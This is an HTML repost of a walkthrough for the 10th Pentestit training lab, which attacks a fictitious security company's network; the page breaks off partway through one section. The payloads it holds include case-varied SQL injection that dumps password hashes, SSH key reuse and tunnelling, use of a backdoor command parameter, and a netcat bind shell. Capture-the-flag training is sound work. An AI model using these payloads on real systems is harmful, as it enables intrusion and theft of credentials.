<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Pentest at Global Data Security - passing the 10th Pentestit Lab</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pentestit laboratories have become a tradition for many. Every May and November, another laboratory opens, and thousands of enthusiasts around the wor...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Pentest at Global Data Security - passing the 10th Pentestit Lab</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/323/4d6/3ae/3234d63ae5b04788a6b4e7a0b93ea204.png" width="100%"><br><br>  Pentestit laboratories have become a tradition for many.  Every May and November, another laboratory opens, and thousands of enthusiasts around the world do not sleep for days to be the first to compromise the network of a new virtual bank, software developers, or information security service provider. <br><br>  On November 25, the next, this time the <a href="https://lab.pentestit.ru/pentestlabs/6">10th laboratory</a> , was launched, where participants were asked to break into the network of the fictitious company Global Data Security, a developer of information security software. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      On December 6, exactly 11 days later, the laboratory was passed by the first participants who were able to get access to each vulnerable node of Global Data Security's network and found special tokens on them - combinations of letters and numbers that need to be entered into the control panel on the Pentestit website . <br><br>  For those who have not yet had time to do the laboratory - it will be active until May 2017, after which the already announced 11th laboratory will replace it.  In the meantime, this article offers a description of all stages of the current laboratory for all those who want to develop their pentest skills and learn more about current vulnerabilities at the end of 2016.  The article turned out to be long, but, I hope, interesting. <br><a name="habracut"></a><br><div class="spoiler">  <b class="spoiler_title">Disclaimer</b> <div class="spoiler_text">  I am not an employee or affiliate of Pentestit.  This document describes the steps I took to solve the tasks in the laboratory.  My personal recommendations and preferences do not in any way relate to the official opinion of Pentestit. <br><br>  All information in this document is provided for educational purposes only.  By continuing to read this document, you agree not to use this information for illegal purposes, and acknowledge that you and you alone are solely responsible for your actions or knowledge gained from this document.  The author of this document and Pentestit will not be liable for any damage caused to anyone as a result of using the knowledge and methods gained from reading this document. <br></div></div><br><h2>  Connect to the lab </h2><br>  Before you begin, you need to register with the lab, set up a VPN connection and connect to the network of the virtual company Global Data Security. <br><br>  Register <a href="https://lab.pentestit.ru/pentestlabs/6">here</a> , and then follow <a href="https://lab.pentestit.ru/how-to-connect">these instructions</a> in order to connect. <br><br>  For testing, you can install in the <a href="https://www.kali.org/">Kali Linux</a> virtual machine - a special Linux distribution for pentesters, which has everything you need to work.  If you haven't done it yet, now is the time. <br><br><h1>  We start testing </h1><br>  After registering and connecting, we see the following network diagram: <br><img src="https://habrastorage.org/files/890/c1b/f56/890c1bf56ddd4fe3a0c8eff7482b4902.png" width="100%"><br><br>  Before us is the gateway with the IP address 192.168.101.9 - the company's external gateway.  Any pentest is useful to start with a passive and active collection of information about the company, its employees, products, services, public sites and subdomains, and much more. <br><br>  <i>Passive</i> collection of information means that we do not communicate directly with the company's servers, but try to find information in publicly available sources - Google, LinkedIn, data.com, GitHub, and others.  Quite often, you can find a lot of interesting things: the names of employees will prompt logins to the internal network, on GitHub you can sometimes find source texts that will help you better learn about the internal structure of products or the infrastructure of a company, and so on. <br><br>  Unfortunately, in this case, the passive collection of information did not give the desired results (but in the <a href="https://habrahabr.ru/company/defconru/blog/303700/">past laboratory</a> , it was very useful in the SSH task), so we turn to the <i>active</i> collection of information, that is, one that involves direct interaction with the company's available resources. . <br><br><h1>  We collect information </h1><br>  We will start by scanning ports available through the gateway: <br><br><img src="https://habrastorage.org/files/acc/298/09e/acc29809e1e24d19b3d6dfdd7a1573e3.png" width="100%"><br><br>  It is also useful to scan other TCP ports, and UDP ports: they are often forgotten, and after all many services, such as internal VPN (for example, as in <a href="https://lab.pentestit.ru/docs/TL8_WU_ru.pdf">laboratory # 8</a> ) and others.  Let's leave it as an exercise, but for now let's concentrate on the information we have already found. <br><br>  As a result, we have access to an SSH server, an SMTP mail server, two sites and a web interface for employees in the form of a CommuniGate Pro on port 8100. Let's start with exploring sites. <br><br>  When you try to go to <a href="http://192.168.101.9/">192.168.101.9,</a> we get a redirect to the store.gds.lab domain.  Apparently, the site is available on this virtual host, and automatically redirects us to it.  Add the required line to / etc / hosts: <br><br><img src="https://habrastorage.org/files/0b4/cf1/d10/0b4cf1d109a5411c9e35f0d4927166a5.png" width="100%"><br><br>  Just in case, we added gds.lab as well.  Now the site is available: <br><br><img src="https://habrastorage.org/files/00f/d45/9de/00fd459de2684e95800b9f5186c557d6.png" width="100%"><br>  We see that in front of us is a store based on OpenCart: <br><br><img src="https://habrastorage.org/files/f5c/ba4/fab/f5cba4fab9f540729b876534d259da5a.png" width="100%"><br><br>  At the same time, various attempts to attack it (for example, to find XSS or use one of the <a href="https://vulners.com/search%3Fquery%3DOpenCart">vulnerabilities</a> found in OpenCart) lead to this page: <br><br><img src="https://habrastorage.org/files/675/fa6/7f0/675fa67f0bd047f985ddd92cfb919c80.png" width="100%"><br>  Apparently, the site is protected using Web Application Firewall.  So, after a bit of intelligence, the following information became known to us: <br><br><ul><li>  The store (apparently, the token store) is based on OpenCart and is available on the virtual host store.gds.lab </li><li>  Based on the site it was not possible to determine the exact version of OpenCart </li><li>  Any rough attack is blocked by WAF (injection, XSS, brute force directories) </li><li>  The folder / admin is available, but simple passwords are not suitable by default. </li></ul><br>  Let's try to access port 80 using virtual host gds.lab: <br><br><img src="https://habrastorage.org/files/9fa/87f/59f/9fa87f59fecb42548de15038e4404e26.png" width="100%"><br><br>  Interestingly, another resource is available here - file hosting ownCloud.  After examining the source code of the page and the message, we understand that the correct virtual host is cloud.gds.lab.  By making the appropriate changes to the hosts file, we get the opportunity to try the login and password: <br><br><img src="https://habrastorage.org/files/670/bc4/598/670bc459870e42409f411c00a8990edb.png" width="100%"><br><br>  Fine!  Having tried several combinations manually, we see that standard passwords are not suitable.  At the same time, we find an interesting feature in ownCloud: it offers to reset the password if the password is incorrect, and depending on whether the required account is present or not, it gives different messages: <br><br>  If there is no account: <br><br><img src="https://habrastorage.org/files/156/763/acf/156763acf8d148fbbddaebdfe038e384.png" width="100%"><br><br>  If the account is registered: <br><br><img src="https://habrastorage.org/files/ac0/bf7/543/ac0bf7543b2e47178230ec1c5bbaa4d7.png" width="100%"><br><br>  The password cannot be picked up, so let's remember the found username and continue to collect information, this time going to the next port - 443. <br><br>  <a href="https://192.168.101.9/">192.168.101.9</a> , unfortunately, is not available via https, with a message like this: <br><br><pre><code class="bash hljs">An error occurred during a connection to 192.168.101.9. SSL received a record that exceeded the maximum permissible length. Error code: SSL_ERROR_RX_RECORD_TOO_LONG</code> </pre> <br>  Apparently, something with SSL.  The site is poorly configured and accessible via HTTP: <br><br><img src="https://habrastorage.org/files/cd2/715/858/cd2715858aa84f91846040a64ea0349f.png" width="100%"><br><br>  Apparently, this is the main website of the company.  Let's try to get our first token! <br><br><h1>  We study the <code>site</code> </h1><br>  After a careful study of the pages of the site, we determine that it is apparently written by the developers of the GDS company, and does not use a ready-made CMS like WordPress. <br><br>  Given the fact that many vulnerabilities are associated with user input, let's look at the entry points available to us.  Find the address: <br><br><pre> <code class="bash hljs">http://192.168.101.9:443/post.php?id=1</code> </pre> <br>  If you add one quote at the end, we get a redirect to the main page of the site, and if two - no.  Looks like a SQL injection.  Having a little experimented, we find that the condition is in brackets: <br><br><pre> <code class="bash hljs">http://192.168.101.9:443/post.php?id=1<span class="hljs-string"><span class="hljs-string">') -- -</span></span></code> </pre> <br>  At the same time attempts to add UNION SELECT do not lead to success, apparently, the site has a filter for SQL injection.  Let's try to get around it using the standard method with a change of case: <br><br><pre> <code class="sql hljs">http://192.168.101.9:443/post.php?id=-1') UNiOn <span class="hljs-keyword"><span class="hljs-keyword">SeLect</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>, @@<span class="hljs-keyword"><span class="hljs-keyword">veRsiOn</span></span> <span class="hljs-comment"><span class="hljs-comment">-- -</span></span></code> </pre><br>  We get the table: <br><br><pre> <code class="sql hljs">http://192.168.101.9:443/post.php?id=-1') UNiOn <span class="hljs-keyword"><span class="hljs-keyword">seLeCT</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">GrouP_CONcaT</span></span>(TabLe_nAmE) <span class="hljs-keyword"><span class="hljs-keyword">FroM</span></span> InfOrMatIoN_scHemA.TabLes <span class="hljs-keyword"><span class="hljs-keyword">WheRe</span></span> TabLe_sCheMa=<span class="hljs-keyword"><span class="hljs-keyword">database</span></span>() <span class="hljs-comment"><span class="hljs-comment">-- -</span></span></code> </pre> <br>  Then the fields: <br><br><pre> <code class="sql hljs">http://192.168.101.9:443/post.php?id=-1') UNiOn <span class="hljs-keyword"><span class="hljs-keyword">seLeCT</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">GrouP_CONcaT</span></span>(ColUmN_nAmE) <span class="hljs-keyword"><span class="hljs-keyword">FroM</span></span> InfOrMatIoN_scHemA.ColuMns <span class="hljs-keyword"><span class="hljs-keyword">WheRe</span></span> TabLe_NaME=<span class="hljs-string"><span class="hljs-string">'users'</span></span> <span class="hljs-comment"><span class="hljs-comment">-- -</span></span></code> </pre> <br>  And then the login and password hash: <br><br><pre> <code class="sql hljs">http://192.168.101.9:443/post.php?id=-1') UNiOn alL (<span class="hljs-keyword"><span class="hljs-keyword">seLeCT</span></span> usErNAme, <span class="hljs-keyword"><span class="hljs-keyword">pAssWoRd</span></span> <span class="hljs-keyword"><span class="hljs-keyword">FroM</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">liMIT</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-comment"><span class="hljs-comment">-- -</span></span></code> </pre> <br><img src="https://habrastorage.org/files/f74/cea/971/f74cea9719e844409409e7568d584dff.png" width="100%"><br><br>  Use hashcat (preferably outside the virtual machine to use the GPU) to recover the password (and <a href="https://github.com/danielmiessler/SecLists">I</a> highly recommend the <a href="https://github.com/danielmiessler/SecLists">SecLists</a> dictionaries): <br><br><img src="https://habrastorage.org/files/579/103/69f/57910369f3814c4383e2d48315077a33.png" width="100%"><br>  Happened!  Using dirsearch we find the administrative interface in the / admin folder: <br><br><img src="https://habrastorage.org/files/b97/0cc/632/b970cc6328514b8bb2f595c1229917fe.png" width="100%"><br><br>  Enter there the found username and password, and get the first token: <br><br><img src="https://habrastorage.org/files/175/88f/564/17588f5643e94275b77249f42c0a68a2.png" width="100%"><br><br>  SQLMap will help to achieve the same result with the --tamper = randomcase option enabled, but the last query will have to be done manually anyway. <br><br><h1>  Take <code>mail</code> </h1><br>  While exploring the site, pay attention to all the information found in the research process.  It is very important not to stop collecting information and continue to record all the features found. <br><br>  In particular, on the Contact Us page there is information about two accounts: <br><br><img src="https://habrastorage.org/files/695/274/1da/6952741dac804138896fc291fc037eb4.png" width="100%"><br><br>  And on the main page there is a link to another person: <br><br><img src="https://habrastorage.org/files/829/6f2/7b2/8296f27b2c3e4ca2a087d013515ceec2.png" width="100%"><br><br>  As a result, we get three accounts for the mail server: <br><ul><li>  a.modlin </li><li>  s.locklear </li><li>  j.wise </li><li>  e.lindsey (the password from the site is suitable, but there is nothing in the mail) </li></ul><br>  Check if one of these users is using a dictionary password: <br><br><img src="https://habrastorage.org/files/725/31e/f8f/72531ef8f87f4d6dbd6c68cf6773d15d.png" width="100%"><br><br>  It turned out to pick a password to the user a.modlin.  Let's use the web mail interface on port 8100: <br><br><img src="https://habrastorage.org/files/1a9/65b/3fe/1a965b3fe0564aad8da1c0ceed128fdf.png" width="100%"><br><br>  Here is the next token, as well as a letter from Joshua Wise with an Android application and the following contents: <br><br><img src="https://habrastorage.org/files/de7/0fd/1ee/de70fd1eec3c42bbab3531e98e860a93.png" width="100%">  . <br><br>  Remember this for the future, judging by the IP address and network diagram, this application is useful to us for the <code>ssh-test</code> token. <br><br>  At the moment we have carefully studied the site (port 443) and used it to get two tokens, in addition, we managed to find two virtual hosts (store.gds.lab and cloud.gds.lab) on the 80th port.  The latter are protected by WAF, so despite the abundance of possible options, it was not possible to find vulnerabilities due to permanent locks. <br><br>  Let's try to get into the internal network and continue from there. <br><br><h1>  Ssh server </h1><br>  Users often use the same passwords on different services.  Let's try to log into the SSH server with e.lindsey, with the password found on the site: <br><br><img src="https://habrastorage.org/files/45e/ce3/531/45ece353153c479f9b516a81b15eae63.png" width="100%"><br><br>  Happened!  Nmap is conveniently present on the host, and the entire internal network is available to us.  Looking for a token, we understand that not everything is so simple. <br><br>  On the server there are a lot of interesting things.  Among other things, we find: <br><ul><li>  many new accounts for / etc / passwd and / home content, </li><li>  the source code of the store in / var / www /, from which we determine the version of OpenCart, the password to the local MySQL and the hash of the OpenCart administrator password </li><li>  folder / data / users with the rights to enter, but without the rights to the listing. </li></ul><br>  A very useful post-operation manual for Linux machines is available <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">here</a> .  In this case, the privilege escalation on the SSH server was not implied by the lab authors, but in any case it is very useful to examine the contents for additional scripts, configuration settings, websites, tasks in the scheduler, connected file systems, and others. <br><br>  Taking into account the fact that there is no token in the site configuration, we will concentrate on the / data / users folder. <br><br><img src="https://habrastorage.org/files/ab7/93d/523/ab793d52321149c29f5948a9ab9d10d3.png" width="100%"><br><br>  As you can see, the r bit is missing on it, but the x bit is present, which means you can go in and work with the contents of the folder, but you cannot watch its listing.  When we encounter the same task on the web (where directory listing is almost always disabled), we use utilities like dirb or dirsearch, which try to open files using a dictionary, sorting through many combinations.  Let's try to do the same here, dictionaries can be used from dirb. <br><br>  Let's write a small script to recursively try out the necessary subdirectories and files according to the dictionary: <br><br><pre> <code class="python hljs"><span class="hljs-string"><span class="hljs-string">"""Importing os to access file system"""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os PATH = <span class="hljs-string"><span class="hljs-string">"/data/users/"</span></span> DICC = <span class="hljs-string"><span class="hljs-string">"/var/tmp/common.txt"</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attempt_path</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(path)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-string"><span class="hljs-string">"""Check if file or directory exists and print out the result. Return true if directory"""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> os.path.isfile(path): <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Found file : "</span></span> + path <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> os.path.isdir(path): <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Found dir : "</span></span> + path <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">look_for_subdirs</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(path)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-string"><span class="hljs-string">"""Recursive function to look for dirs"""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(DICC) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> dicc: <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> line <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> dicc: curr_path = path + line.rstrip(<span class="hljs-string"><span class="hljs-string">'\n'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> attempt_path(curr_path): look_for_subdirs(curr_path + <span class="hljs-string"><span class="hljs-string">"/"</span></span>) look_for_subdirs(PATH) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Finished"</span></span></code> </pre><br>  Now you need to prepare a dictionary and upload it to the ssh server.  One way is to put the dictionary and our python code on a local web server, and then download them from it using wget. <br><br>  Take the dictionary from dirb, which in kali is located at <code>/usr/share/dirb/wordlists/common.txt</code> , and add the names of local users, and at the same time the file token.txt (we hope it is somewhere there): <br><br><img src="https://habrastorage.org/files/e91/1e3/74d/e911e374d2004d8ea8feffd0a3371156.png" width="100%"><br><br><img src="https://habrastorage.org/files/d83/e6a/145/d83e6a145fe34673adef847a6927793a.png" width="100%"><br><br>  Unfortunately, our IP is not directly accessible from host 172.16.0.8, so we use an SSH tunnel: <br><br><img src="https://habrastorage.org/files/b99/d91/f5e/b99d91f5ee914b1b9b71da99f8403740.png" width="100%"><br><br>  There are two points that need attention. <br><br>  At the beginning, we do remote port forwarding, by calling the remote part ‚Äúlocalhost: 80‚Äù (that is, on our local Kali machine on port 80) on the local (for SSH server) port 8765. You can call this command line ssh&gt; by pressing the ~ C key combination (holding shift and pressing ~ and then C). <br><br>  Now our local webserver is available to us on the SSH host.  The proxy server is enabled by default on the server, for the local port it should be removed with the <code>unset</code> . <br><br>  Now everything is ready to run our script: <br><br><img src="https://habrastorage.org/files/68b/d2a/2a4/68bd2a2a454545d485925266a43c0918.png" width="100%"><br><br>  In the folder <code>/data/users/rross/docs/</code> found a token and SSH-key rross-a.  In addition, we still found the a.modlin user's SSH key.  Surely one of them will approach ssh-test.  We continue! <br><br><h1>  Understanding <code>ssh-test</code> </h1><br>  When we found the <code>mail</code> token, the version of the gds-authenticator application became available to us: <br><br><img src="https://habrastorage.org/files/de7/0fd/1ee/de70fd1eec3c42bbab3531e98e860a93.png" width="100%">  . <br>  As can be seen from the letter addressed to Alfred Modlin, he will need two factors to log on to the server - a key or password, and an SSH port number, which is constantly changing.  The effectiveness of the second factor is very doubtful, because the open port can be simply found using nmap, but nevertheless we will make this task the intended way for the authors.  Extract the apk and extract the classes.dex: <br><br><img src="https://habrastorage.org/files/3a6/9b1/518/3a69b15180834273aebbf6f2b7bdd555.png" width="100%"><br><br>  Then we convert dex to jar using the utility of the same name: <br><br><img src="https://habrastorage.org/files/651/168/5e9/6511685e9f41439baada8835c0ffe3b9.png" width="100%"><br><br>  And finally, use the <a href="http://jd.benow.ca/">JD</a> decompiler to get the source code: <br><br><img src="https://habrastorage.org/files/5c9/ae1/235/5c9ae1235bf84aad8962456f9c53c1cd.png" width="50%"><br><br><pre> <code class="java hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">setAuthCode</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ String str = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> HOTP().gen(<span class="hljs-string"><span class="hljs-string">"WFLHQEBMJ3XLPDOY"</span></span>, (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)Math.floor(System.currentTimeMillis() / <span class="hljs-number"><span class="hljs-number">1000L</span></span> / <span class="hljs-number"><span class="hljs-number">30L</span></span>), <span class="hljs-number"><span class="hljs-number">6</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = Integer.parseInt(str.substring(-<span class="hljs-number"><span class="hljs-number">5</span></span> + str.length())); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (i &gt; <span class="hljs-number"><span class="hljs-number">65534</span></span>) { i %= <span class="hljs-number"><span class="hljs-number">65534</span></span>; } TextView localTextView = (TextView)findViewById(<span class="hljs-number"><span class="hljs-number">2131492983</span></span>); Object[] arrayOfObject = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Object[<span class="hljs-number"><span class="hljs-number">1</span></span>]; arrayOfObject[<span class="hljs-number"><span class="hljs-number">0</span></span>] = Integer.valueOf(i); localTextView.setText(String.format(<span class="hljs-string"><span class="hljs-string">"%d"</span></span>, arrayOfObject)); }</code> </pre><br>  As you can see, the HOTP class is used, also available in apk, which is given a seed and milliseconds for the calculation.  Let's try to extract the code that generates the port number to learn how to do it, if desired, automatically. <br><br><img src="https://habrastorage.org/files/835/20d/4ae/83520d4ae1494aed90d7e2045973000a.png" width="100%"><br><br>  And then compile and run: <br><br><img src="https://habrastorage.org/files/fdc/601/5c8/fdc6015c8e784743b0264573eec5c1dc.png" width="100%"><br><br>  There is a port, it remains to write a command that will connect to ssh test in one line.  <code>/data/users/a.modlin/docs/key</code> to a local folder, and then use sshuttle to make the internal network accessible from our Kali-machine. <br><br>  sshuttle (also called a poor man's VPN) uses iptables rules to make internal subnets accessible via ssh tunnels.  Connect in this way: <br><br><img src="https://habrastorage.org/files/106/205/1d8/1062051d89b74b96ad4e983e364593ed.png" width="100%"><br><br>  Make a bash script to connect: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/sh ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i key a.modlin@172.16.0.1 -p$(java Main)</span></span></code> </pre><br>  Connect and find the next token: <br><br><img src="https://habrastorage.org/files/fc5/f9c/3e3/fc5f9c3e322c40ff953201ae501cc1ae.png" width="100%"><br><br><h1>  Attack the <code>blog</code> </h1><br>  Judging by the network scheme, the company's blog is located at 192.168.0.4, a quick scan of the ports confirms the presence of the open 80th port.  Connect via sshuttle and see what can be found on the blog: <br><br><img src="https://habrastorage.org/files/d2d/851/3af/d2d8513afb5749f5970e3f218435e527.png" width="100%"><br><br>  Looks like a Joomla installation!  Check: <br><br><img src="https://habrastorage.org/files/082/07e/e68/08207ee68b95480bbf8275f506b0c957.png" width="100%"><br><br>  And there is.  Let's try the recently <a href="https://github.com/XiphosResearch/exploits/tree/master/Joomraa">reported vulnerability in Joomla</a> , which allows you to create an administrator account without authentication.  You can use the link exploit, or you can, for example, a module from Metasploit: <br><br><img src="https://habrastorage.org/files/209/f4a/62b/209f4a62bee7467393b3f87c14a0c23f.png" width="100%"><br><br>  Now just go under the desired user: <br><br><img src="https://habrastorage.org/files/dc9/2a2/b7b/dc92a2b7b19a4d328bbcb7fcf99cd8cc.png" width="100%"><br><br>  Find an unpublished article: <br><br><img src="https://habrastorage.org/files/8b6/005/538/8b6005538d6f4ac2bc8603743f14b5ad.png" width="100%"><br>  And we use its alias in the form of a token, and the blog succumbed! <br><br><h1>  Parsing <code>captcha</code> </h1><br>  The server with captcha at <a href="http://192.168.0.7/">192.168.0.7</a> doesn‚Äôt offer very much - just a blank page with a blank image.  Having studied the source code a little <br>  page (previously connected to ssh using sshuttle), we can draw the following conclusions: <br><br><ul><li>  The image is generated in the pseudo-randomly named sources subfolder </li><li>  The name of the subfolder is saved for each session, and is re-generated for the new session (this is understandable if you change PHPSESSID) </li><li>  The picture itself doesn‚Äôt work - apparently, some old forgotten development version </li></ul><br>  None of this gives direct instructions on what to do next.  Using dirsearch, we find something interesting: <br><br><img src="https://habrastorage.org/files/ff2/b41/701/ff2b417019aa44fcb47423ea87f75643.png" width="100%"><br><br>  Based on the contents of robots.txt, we understand that there is some hidden bak file in which, apparently, is the most interesting. <br><br><img src="https://habrastorage.org/files/a5c/2cd/f42/a5c2cdf4234b4f0d878d952f55277f9f.png" width="100%"><br><br>  At the same time readme.txt says that the picture is deleted some time after it was generated. <br><br>  Take the path to the picture from the main page: <br><br><pre> <code class="bash hljs">http://192.168.0.7/sources/43f1045f7bfd9bac63fc56dee0de5fc079b2e8a5b504548052de295444e71f5a496e1b931063b6e731844c2bfc2fd3f2cde4cd566d7c77c6e195a8b1362d9955f5ecc512b28eed353386bd0c07f7e17704ea3e4c59450e1b1c2a30e19bfacff4662cb0/captcha.png</code> </pre><br>  Since we are looking for a hidden bak file, try replacing the png extension with bak: <br><br><pre> <code class="bash hljs">http://192.168.0.7/sources/43f1045f7bfd9bac63fc56dee0de5fc079b2e8a5b504548052de295444e71f5a496e1b931063b6e731844c2bfc2fd3f2cde4cd566d7c77c6e195a8b1362d9955f5ecc512b28eed353386bd0c07f7e17704ea3e4c59450e1b1c2a30e19bfacff4662cb0/captcha.bak</code> </pre><br><img src="https://habrastorage.org/files/072/37e/dfa/07237edfa457414ba190185f483d7274.png" width="100%"><br><br>  Apparently, this is a backup copy of the source code, which says that there is a captcha file with a serialized session, and a backdoor-shell file that accepts commands in the GET parameter of the session and executes them. <br><br>  Unfortunately, if you go again - the file is no more.  Where did he go?  Remember the readme.txt: it is deleted after a while.  After several attempts, we understand that the file becomes available again after calling on /index.php.  Let's make a small loop that will do this for us all the time to keep captcha.bak and other files available: <br><br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> curl -i -s -k -b <span class="hljs-string"><span class="hljs-string">'PHPSESSID=et07feiohsrnaf11n0kt31rf83'</span></span> http://192.168.0.7/; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span></code> </pre><br>  The file is in place again.  It remains to apply to <code>($_SESSION.php)?session=whoami</code> to make sure that we are able to execute the code remotely: <br><br><img src="https://habrastorage.org/files/e1a/90a/631/e1a90a631f444baa91a9333b4be978d1.png" width="80%"><br><br>  Now we‚Äôll make a bind shell on host 192.168.0.7 on port 1234: <br><br><pre> <code class="bash hljs">http://192.168.0.7/sources/43f1045f7bfd9bac63fc56dee0de5fc079b2e8a5b504548052de295444e71f5a496e1b931063b6e731844c2bfc2fd3f2cde4cd566d7c77c6e195a8b1362d9955f5ecc512b28eed353386bd0c07f7e17704ea3e4c59450e1b1c2a30e19bfacff4662cb0/(<span class="hljs-variable"><span class="hljs-variable">$_SESSION</span></span>).php?session=nc -e /bin/sh -nvlp 1234</code> </pre><br>  And connect to it: <br><br><img src="https://habrastorage.org/files/c64/7aa/2e7/c647aa2e72b847a1bb8fe5da602aea87.png" width="100%"><br><br>  Here is another token! <br><br><h1>  Taking <code>hall-of-fame</code> </h1><br>  After examining the open ports on 192.168.0.8 we find a site with a description of known hackers and the ability to log in: <br><br><img src="https://habrastorage.org/files/78e/dec/1e4/78edec1e4dc94f278bc9274e9d521a3f.png" width="100%"><br><br>  It is useful to start by examining the site map, accessible and hidden directories, and attempts to identify available users.  Unfortunately, the login form does not work on well-known names. <br><br>  Attention is drawn to the addresses of the form <code>http://192.168.0.8/index.php?hname=James</code> , since the parameter may be an example of a vulnerability such as LFI (local file inclusion), but attempts to exploit it by substituting system paths do not lead to success.  Let us turn to dirsearch and try to find hidden directories: <br><br><img src="https://habrastorage.org/files/9d5/f9a/185/9d5f9a185d634754801e150c918193b0.png" width="100%"><br><br>  Among other things, there was an interesting file: /backup/passwords.txt, and the / dev subfolder, closed for basic-authentication.  Use these passwords on the login page: <br><br><img src="https://habrastorage.org/files/4f2/183/e96/4f2183e96733423082dece45028f4914.png" width="100%"><br><br>  After login, we get the password to the / dev part.  Use it to go to / dev: <br><br><img src="https://habrastorage.org/files/bf4/d47/37b/bf4d4737b1c742a0892fb08b1d9f14cf.png" width="100%"><br><br>  Inside we get a copy of the external site, but on it the previously suspected hname parameter is vulnerable to <a href="https://defcon.ru/web-security/3840/">Server-Side Template Injection</a> .  As you can see, by entering {{7 * 7}} we get the result of operation (49) in the page header - which was calculated on the server.  We got RCE. <br><br><img 